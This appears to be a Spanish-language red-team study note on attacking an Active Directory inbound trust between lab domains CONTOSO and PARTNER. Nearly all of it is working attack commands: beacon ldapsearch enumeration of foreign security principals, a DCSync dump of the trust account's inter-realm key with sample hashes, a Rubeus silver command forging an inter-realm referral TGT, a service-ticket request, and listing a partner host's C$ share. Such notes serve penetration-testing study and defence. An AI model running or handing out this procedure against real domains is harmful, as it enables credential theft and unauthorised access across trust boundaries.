---
tags: [ad, trusts, inbound-trust, inter-realm, foreignsecurityprincipal]
status: completo
---

# Inbound Trusts

> Trust entrante: el dominio local (CONTOSO) confía en el externo (PARTNER). Los usuarios de CONTOSO pueden acceder a recursos en PARTNER. Para movernos a PARTNER necesitamos la inter-realm key.

**Escenario**: Comprometido CONTOSO, trust inbound hacia PARTNER.COM (trustDirection=1)

---

## 1. Enumerar Foreign Security Principals

```
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
```

→ Resultado: SIDs de CONTOSO como miembros de grupos en PARTNER
```
cn: S-1-5-21-3926355307-1661546229-813047887-6102
memberOf: CN=Contoso Users,CN=Users,DC=partner,DC=com
```

Resolver el SID en CONTOSO para identificar el usuario/grupo.

---

## 2. Enumerar Equipos en PARTNER

```
beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname par-dc-1.partner.com
→ PAR-DC-1$, PAR-JMP-1$
```

---

## 3. Obtener la Inter-Realm Key

La inter-realm key se almacena en la cuenta de trust `CONTOSO\PARTNER$`:

```
beacon> dcsync contoso.com CONTOSO\PARTNER$
→ rc4_hmac_nt: 6150491cceb080dffeaaec5e60d8f58d
→ aes256_hmac: cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
```

---

## 4. Forjar Referral TGT (Rubeus silver)

```
Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:<CONTOSO_SID> /id:<RID> /groups:513,1106,6102 /service:krbtgt /target:partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```

| Parámetro | Descripción |
|-----------|-------------|
| `/service:krbtgt` | Estamos forjando un inter-realm TGT |
| `/target:partner.com` | Dominio destino |
| `/groups` | Grupos del usuario en PARTNER (usar `/ldap` si accesible o manualmente) |
| `/rc4` | Inter-realm key |

> Los trusts usan RC4 por defecto — usar `/rc4` en lugar de `/aes256`

---

## 5. Solicitar Service Ticket al KDC de PARTNER

```
beacon> execute-assembly Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:<b64_referral_tgt> /nowrap
```

```
beacon> ls \\par-jmp-1.partner.com\c$
```

## Ver también

- [[05-ad-attacks/trusts|Trusts]]
- [[05-ad-attacks/trusts/inter-realm-tickets|Inter-Realm Tickets]]
- [[05-ad-attacks/trusts/outbound-trusts|Outbound Trusts]]
- [[05-ad-attacks/ataques/dcsync|DCSync]]
